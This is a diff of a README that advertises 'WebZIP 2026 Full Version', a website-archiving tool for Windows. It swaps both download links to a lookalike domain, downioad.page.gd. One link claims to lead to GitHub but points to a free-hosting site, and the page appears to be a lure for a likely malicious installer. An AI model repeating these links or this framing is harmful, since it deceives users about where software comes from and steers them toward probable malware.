@@ -2,7 +2,7 @@
 
 WebZIP is a powerful application designed to download and archive entire websites for offline viewing. With its intuitive interface and advanced features, it allows users to save web content efficiently on Windows 10 and 11 systems. This guide will help you get started with WebZIP 2026 Full Version, covering installation, features, and common queries.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Overview
 
@@ -62,7 +62,7 @@ A: WebZIP allows unlimited downloads, but be mindful of storage space on your co
 
 To download the latest version of WebZIP, please visit the official download page via the link below:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 *Last Updated: January 2026*
 
